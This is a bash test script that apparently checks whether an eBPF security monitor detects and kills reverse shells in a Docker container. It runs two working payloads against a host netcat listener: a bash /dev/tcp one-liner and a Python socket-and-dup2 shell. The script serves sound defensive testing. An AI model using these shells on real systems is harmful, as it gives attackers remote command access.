#!/bin/bash
# Scenario 2: Reverse Shell
# Method A: bash reverse shell (caught by execve handler + dup2 invariant)
# Method B: python reverse shell (caught by dup2 invariant ONLY — key test)
# Expected: ALERT_REVERSE_SHELL + ALERT_FD_REDIRECT, SIGKILL
set -e
echo "=== SCENARIO 2: Reverse Shell ==="

# Start listener on host
nc -l -p 9999 &
LISTENER_PID=$!
sleep 1

# Get host IP on docker bridge
HOST_IP=$(docker network inspect ct_prod_net \
    --format '{{range .IPAM.Config}}{{.Gateway}}{{end}}' 2>/dev/null || echo "10.88.0.1")

echo "[Method A] bash reverse shell in ct-webapp-a..."
docker exec ct-webapp-a bash -c \
    "exec 5<>/dev/tcp/${HOST_IP}/9999; cat <&5 | /bin/sh 2>&5 >&5" \
    2>&1 || true
echo "  Exit code: $? (137 = SIGKILL from eBPF)"
sleep 2

# Restart listener
kill $LISTENER_PID 2>/dev/null || true
nc -l -p 9999 &
LISTENER_PID=$!
sleep 1

echo "[Method B] python reverse shell in ct-webapp-a..."
docker exec ct-webapp-a python3 -c "
import socket,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('${HOST_IP}',9999))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
os.system('/bin/sh')
" 2>&1 || true
echo "  Exit code: $? (137 = SIGKILL from dup2 invariant)"

kill $LISTENER_PID 2>/dev/null || true
echo "=== Scenario 2 complete ==="
